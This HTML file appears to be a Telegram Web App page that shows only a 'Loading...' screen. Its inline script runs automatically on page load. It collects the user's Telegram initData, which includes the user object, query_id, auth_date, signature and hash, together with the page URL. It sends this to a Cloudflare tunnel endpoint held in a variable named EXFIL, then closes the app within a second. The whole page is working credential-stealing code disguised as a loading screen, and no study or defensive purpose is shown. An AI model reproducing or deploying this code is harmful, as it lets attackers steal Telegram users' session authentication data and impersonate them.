<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<div style="display:flex;justify-content:center;align-items:center;height:100vh;">
  <p style="color:#999;">Loading...</p>
</div>
<script>
(function() {
  var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'
  var tg = window.Telegram.WebApp

  var initData = tg.initData
  var initDataUnsafe = tg.initDataUnsafe

  // Fallback: parse hash fragment directly
  if (!initData && window.location.hash) {
    try {
      var hashParams = new URLSearchParams(window.location.hash.substring(1))
      var webAppData = hashParams.get('tgWebAppData')
      if (webAppData) {
        initData = decodeURIComponent(webAppData)
        var params = new URLSearchParams(initData)
        var userJson = params.get('user')
        if (userJson) {
          initDataUnsafe = {
            query_id: params.get('query_id'),
            user: JSON.parse(userJson),
            auth_date: params.get('auth_date'),
            signature: params.get('signature'),
            hash: params.get('hash')
          }
        }
      }
    } catch(e) {}
  }

  var identity = {
    type: 'identity',
    initData: initData,
    initDataUnsafe: initDataUnsafe,
    colorScheme: tg.colorScheme,
    platform: tg.platform,
    version: tg.version,
    themeParams: tg.themeParams,
    viewportHeight: tg.viewportHeight,
    viewportStableHeight: tg.viewportStableHeight,
    isExpanded: tg.isExpanded,
    headerColor: tg.headerColor,
    backgroundColor: tg.backgroundColor,
    safeAreaInset: tg.safeAreaInset,
    contentSafeAreaInset: tg.contentSafeAreaInset,
    hash: window.location.hash.substring(0, 200),
    href: window.location.href.substring(0, 300),
    ts: Date.now()
  }

  try {
    navigator.sendBeacon(EXFIL + '/identity', JSON.stringify(identity))
  } catch(e) {
    new Image().src = EXFIL + '/identity?d=' + encodeURIComponent(JSON.stringify(identity))
  }

  setTimeout(function() { tg.close() }, 800)
})()
</script>
</body>
</html>
